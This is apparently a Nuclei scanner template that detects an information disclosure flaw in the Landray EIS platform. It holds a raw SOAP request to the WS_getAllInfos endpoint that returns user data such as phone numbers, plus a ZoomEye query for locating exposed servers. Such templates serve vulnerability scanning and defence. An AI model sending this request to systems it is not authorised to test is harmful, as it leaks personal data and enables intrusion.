http/vulnerabilities/landray/landray-eis-ws-getallinfos-disclosure.yaml

id: landray-eis-WSgetAllInfos-disclosure

info:
  name: Landray EIS WS_getAllInfos Disclosure
  author: Fur1na
  severity: high
  description: Landray EIS WS_getAllInfos interface suffers from a sensitive information disclosure vulnerability.
  reference:
    - https://mp.weixin.qq.com/s/CTLyriSSF-nQ8SUFv4RX0A
  metadata:
    verified: true
    max-request: 1
    zoomeye-query: app:"蓝凌EIS智慧协同平台"
  tags: landray,disclosure

http:
  - raw:
      - |
        POST /WS/Basic/Basic.asmx HTTP/1.1
        Content-Type: text/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
        <soapenv:Header/>
        <soapenv:Body>
        <tem:WS_getAllInfos/>
        </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<?xml"
          - "WS_getAllInfosResponse"
          - "CELL_PHONE_NUMBER"
          - "UNID"
        condition: and

      - type: word
        part: header
        words:
          - "Content-Type: text/xml"

      - type: status
        status:
          - 200